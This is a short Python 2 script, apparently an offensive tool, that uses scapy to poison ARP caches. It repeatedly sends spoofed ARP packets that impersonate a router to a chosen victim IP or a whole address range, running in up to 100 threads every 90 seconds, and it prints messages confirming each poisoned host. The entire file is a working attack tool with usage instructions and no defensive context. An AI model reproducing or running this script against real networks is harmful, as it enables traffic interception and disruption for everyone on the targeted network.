#!/usr/bin/env python
import scapy, sys, time, threading

def ip_iterate(start, end):
        start = map(int,start.split("."))
        end = map(int,end.split("."))
        ips = []
        while start != end:
                ips.append(".".join(map(str,start)))
                start[3] += 1
                if start[3] > 254:
                        start[3] = 1
                        start[2] += 1
                for i in range(2,-1,-1):
                        if start[i] > 255:
                                start[i] = 0
                                start[i-1] += 1               
        ips.append(".".join(map(str,end)))
        return ips

class poisonARP(threading.Thread):
        def __init__(self,ip):
                threading.Thread.__init__(self)
                self.ip = ip
        def run(self):
                a = scapy.ARP()
                a.psrc = sys.argv[1]
                a.pdst = self.ip
                scapy.send(a)
                print "[+] Poisoned entry %s for host %s" % (sys.argv[1],self.ip)


if __name__ == "__main__":
        thread_limit = 100
        scapy.conf.verb = 0
        
        if len(sys.argv) < 3:
                print "Usage: %s Router-IP Victim-IP [End-Range-IP]\n- Examples -" % sys.argv[0]
                print "For a single host:"
                print "\t%s 192.168.1.1 192.168.1.235" % sys.argv[0]
                print "For a range of hosts:"
                print "\t%s 192.168.1.1 192.168.2 192.168.254" % sys.argv[0]
                sys.exit(0)
        if len(sys.argv) == 3: end = sys.argv[2]
        else: end = sys.argv[3]

        ips = ip_iterate(sys.argv[2],end)
        while True:
                for ip in ips:
                        while threading.activeCount() > thread_limit: pass
                        poisonARP(ip).start()
                time.sleep(90)
